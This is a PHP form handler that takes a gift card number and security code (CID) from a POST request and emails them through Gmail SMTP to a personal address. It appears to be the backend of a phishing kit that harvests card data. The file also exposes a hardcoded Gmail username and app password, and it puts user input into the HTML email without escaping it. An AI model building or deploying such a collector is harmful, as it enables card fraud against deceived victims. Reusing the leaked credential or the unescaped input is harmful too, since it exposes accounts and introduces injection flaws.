<?php

require 'smtp/PHPMailerAutoload.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit("Invalid request");
}

// form data
$number = $_POST['number'] ?? '';
$cid    = $_POST['cid'] ?? '';

// validation
if (empty($number) || empty($cid)) {
    exit("All fields required");
}

// email body
$body = "
<h2>Gift Card Submission</h2>
<p><b>Card Number:</b> $number</p>
<p><b>CID:</b> $cid</p>
";

$mail = new PHPMailer();

$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = "jhnkenrick@gmail.com";   // your email
$mail->Password = "iclvtpqxcjdprtfh";       // app password
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

$mail->setFrom("jhnkenrick@gmail.com", "Gift Form");
$mail->addAddress("jhnkenrick@gmail.com");

$mail->isHTML(true);
$mail->Subject = "New Gift Card Data";
$mail->Body = $body;

// send mail
if($mail->send()){
    echo "success";
} else {
    echo "error";
}
?>
